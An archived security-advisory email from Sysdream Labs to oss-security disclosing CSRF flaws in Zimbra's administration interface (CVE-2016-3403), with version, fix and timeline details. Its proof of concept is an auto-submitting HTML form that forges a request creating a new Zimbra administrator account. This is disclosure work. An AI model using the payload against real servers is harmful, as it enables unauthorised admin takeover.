X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["3621" "Wednesday" "11" "January" "2017" "15:10:02" "+0100" "Sysdream Labs" "labs@sysdream.com" "<cf184207-ba87-9bd0-d1f9-d654f4cdc18e@sysdream.com>" "117" "[oss-security] [CVE-2016-3403] [Zimbra] Multiple CSRF in Administration interface - all versions" nil nil nil "1" "2017011114:10:02" "[oss-security] [CVE-2016-3403] [Zimbra] Multiple CSRF in Administration interface - all versions" (number mark "U       labs@sysdrea Jan 11  117/3621  " thread-indent "\"[oss-security] [CVE-2016-3403] [Zimbra] Multiple CSRF in Administration interface - all versions\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0000
X-Mozilla-Status2: 00000000
Received: (qmail 19861 invoked by uid 550); 11 Jan 2017 14:10:20 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 19840 invoked from network); 11 Jan 2017 14:10:19 -0000
DKIM-Filter: OpenDKIM Filter v2.9.2 mail.sysdream.com 5D3BC1A0C26
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=sysdream.com;
	s=FEF1D5FC-BC6A-11E6-98AA-27E162F08D53; t=1484143803;
	bh=Ba4jIz8dY73l/ApIgjSwAPy3m0CHYzwaeuQgDpaIrDU=;
	h=From:Subject:To:Message-ID:Date:MIME-Version:Content-Type;
	b=H4I/MvmfJN7COOLAJmPVoLoXdH4EuM/ze+VDY8YHsJOvQK3jHHdUyPzZwKRZQhcFx
	 9QPqLhzMBa4K1zlZBi171DJ9m0teI/1gAQrUomY95i9SmCuzZYJK1ceBI60MS7T+Ct
	 NqA0WEYdI1Ak42+23CYOp5ue+paUGC8cwCnZbL30=
From: Sysdream Labs <labs@sysdream.com>
To: oss-security@lists.openwall.com
Cc: fulldisclosure@seclists.org
Message-ID: <cf184207-ba87-9bd0-d1f9-d654f4cdc18e@sysdream.com>
Date: Wed, 11 Jan 2017 15:10:02 +0100
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101
 Thunderbird/45.6.0
MIME-Version: 1.0
Content-Type: multipart/signed; micalg=pgp-sha256;
 protocol="application/pgp-signature";
 boundary="I5J8lKke7fqLUWwR9mCSL5n49W6koV3om"
Subject: [oss-security] [CVE-2016-3403] [Zimbra] Multiple CSRF in Administration interface -
 all versions

--I5J8lKke7fqLUWwR9mCSL5n49W6koV3om
Content-Type: multipart/mixed; boundary="mJmoN6HjFjpE3oA5sFLmfWrScmAohw1qI"
From: Sysdream Labs <labs@sysdream.com>
To: oss-security@lists.openwall.com
Cc: fulldisclosure@seclists.org
Message-ID: <cf184207-ba87-9bd0-d1f9-d654f4cdc18e@sysdream.com>
Subject: [CVE-2016-3403] [Zimbra] Multiple CSRF in Administration interface -
 all versions

--mJmoN6HjFjpE3oA5sFLmfWrScmAohw1qI
Content-Type: text/plain; charset=utf-8
Content-Transfer-Encoding: quoted-printable

# CVE-2016-3403: Multiple CSRF in Zimbra Administration interface

## Description

Multiple CSRF vulnerabilities have been found in the administration
interface of Zimbra, giving possibilities like adding, modifying and
removing admin accounts.

## Vulnerability

Every forms in the Administration part of Zimbra are vulnerable to CSRF
because of the lack of a CSRF token identifying a valid session. As a
consequence, requests can be forged and played arbitrarily.

**Access Vector**:   remote
**Security Risk**:   low
**Vulnerability**:   CWE-352
**CVSS Base score**: 5.8

## Proof of Concept

```html
<html>
<body>
<form enctype=3D"text/plain" id=3D"trololo"
action=3D"https://192.168.0.171:7071/service/admin/soap/CreateAccountReques=
t"
method=3D"POST">
    <input name=3D'<soap:Envelope
xmlns:soap=3D"http://www.w3.org/2003/05/soap-envelope"><soap:Header><context
xmlns=3D"urn:zimbra"><userAgent xmlns=3D"" name=3D"DTC"/><session xmlns=3D""
id=3D"1337"/><format xmlns=3D""
type=3D"js"/></context></soap:Header><soap:Body><CreateAccountRequest
xmlns=3D"urn:zimbraAdmin"><name xmlns=3D"">itworks@ubuntu.fr</name><password
xmlns=3D"">test1234</password><a xmlns=3D""
n=3D"zimbraAccountStatus">active</a><a xmlns=3D""
n=3D"displayName">ItWorks</a><a xmlns=3D"" n'

        value=3D'"sn">itworks</a><a xmlns=3D""
n=3D"zimbraIsAdminAccount">TRUE</a></CreateAccountRequest></soap:Body></soa=
p:Envelope>'/>
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```

## Solution

  * Upgrade to version 8.7

## Affected versions

 * All versions previous to 8.7

## Fixes

 * https://bugzilla.zimbra.com/show_bug.cgi?id=3D100885
 * https://bugzilla.zimbra.com/show_bug.cgi?id=3D100899

## Timeline (dd/mm/yyyy)

 * 24/02/2016: Issue reported to Zimbra
 * 24/02/2016: Issue aknwoledged
 * 20/06/2016: complete fixes released with version 8.7

## Credits

 * Anthony LAOU-HINE TSUEI, Sysdream (laouhine_anthony -at- hotmail
-dot- fr)
 * Damien CAUQUIL, Sysdream (d.cauquil -at- sysdream -dot- com)
=20
=20



--mJmoN6HjFjpE3oA5sFLmfWrScmAohw1qI--

--I5J8lKke7fqLUWwR9mCSL5n49W6koV3om
Content-Type: application/pgp-signature; name="signature.asc"
Content-Description: OpenPGP digital signature
Content-Disposition: attachment; filename="signature.asc"

-----BEGIN PGP SIGNATURE-----
Version: GnuPG v2

iQIcBAEBCAAGBQJYdjy6AAoJEI60jNnVslmh/c8P/2N8zya1pq0JIFK8V8rZ0K1+
OBEsDnlRPqYHnqez9y+YKSMvuNdEsQ3gQSwsJ7IORkpvYTubDZgiYlnX41amuMfJ
p1OAzFQNkUZSg6zmQaqn20h7m9sts9RMkTwbY4h05SXqT+DY1Gk+y69sa+TZtiC+
+/Bl6zwnYkSkRNA/ZRnO8smUb7v3LMTjTxP2kY0YC82k6scK2UB7PjMtU18Dt4NO
/cnLxeHHyGBovYyifJ/VDrL57ohjY+nJmC93n/voJoweqJge56qu/rThlbvshzZO
TL3UNuFiHVGWgWPfiVMtRJ7/BxK4spvEjdGnxQdAc8qsYxGuZX3xY2fzTDZIm6Y0
gjdoPPywXZfstnm0Vj19L6Y47WSbw01NVjqVImPoS4XqE5pGa1rS881Le1gFQ7ex
sMKUASDIH5ylONIOo/VfCsZXPFYvRYIc+NNsRK+D2V8QoWoSCkypHKy2EGt1Zq8a
Z0AGM3Ct4n9O02Wyybgbnnl5xXOVRh0pY5V3pFv8y5kfQbp0BiPpcl8qvSYLhAt1
JRgN2EwKcTC6rJ0izVLb4JN24QSorKDnPHIS/qyKG2btNSM4RwJ3rlFofhAKPIo/
2lbrEW80YWuNknfDz19SuoLTJNqRBpqfz2Rws3LJqQSctJ4rRh5IZk6YXdjBF9D2
yVPX6e2ZcEaMF5usI8bS
=udhk
-----END PGP SIGNATURE-----

--I5J8lKke7fqLUWwR9mCSL5n49W6koV3om--
